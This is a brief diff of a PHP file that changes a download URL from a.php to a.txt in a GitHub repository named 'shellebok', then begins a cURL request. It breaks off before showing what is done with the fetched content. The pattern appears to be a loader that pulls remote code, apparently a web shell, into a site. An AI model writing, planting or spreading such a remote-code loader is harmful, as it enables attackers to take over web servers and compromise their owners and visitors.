@@ -1,5 +1,5 @@
 <?php
-$url = 'https://raw.githubusercontent.com/ebokzsss/shellebok/refs/heads/main/a.php';
+$url = 'https://raw.githubusercontent.com/ebokzsss/shellebok/refs/heads/main/a.txt';
 
 // Inisialisasi cURL
 $ch = curl_init();
